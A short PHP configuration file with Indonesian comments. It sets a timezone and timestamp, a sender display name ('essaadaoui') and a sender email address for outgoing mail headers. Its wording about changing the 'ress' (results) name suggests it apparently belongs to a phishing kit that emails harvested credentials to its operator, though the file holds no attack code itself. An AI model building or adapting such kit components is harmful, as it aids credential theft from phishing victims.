<?php
// Halaman Untuk Ganti Nama Ress
// Dan Email Sender

// Mengambil Waktu Setempat
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');


$namaress = "👽 essaadaoui 👽";
$emailsender = "admin@qinn.my.id";
$kirim = "From: ".$namaress." <".$emailsender.">";
?>
